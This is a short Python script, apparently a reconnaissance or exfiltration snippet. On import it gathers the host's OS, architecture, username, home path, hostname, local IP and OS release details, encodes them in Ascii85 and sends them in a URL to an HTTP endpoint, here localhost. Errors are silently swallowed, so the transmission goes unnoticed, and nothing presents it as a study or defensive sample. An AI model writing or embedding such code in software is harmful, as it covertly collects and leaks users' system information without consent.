import platform, socket, base64
from pathlib import Path
import urllib.parse, requests

class OSRecon:
    def __init__(self):
        self.os = platform.system()
        self.arch = "{0} {1}".format(platform.machine(), platform.architecture()[0])
        self.username = platform.os.getlogin()
        self.home = str(Path.home())
        self.node = platform.node()
        self.node_ip = socket.gethostbyname(socket.gethostname())
        try:
            self.dump = platform.freedesktop_os_release()
        except:
            self.dump = None

        self.concatenated_data = "{0};{1};{2};{3};{4};{5};{6}".format(
            self.os, self.arch, self.username, self.home, self.node, self.node_ip, self.dump
        )
        r = requests.get('http://127.0.0.1:8000/' + urllib.parse.quote(base64.a85encode(self.concatenated_data.encode())))
        
try:
    OSRecon()
except:
    pass
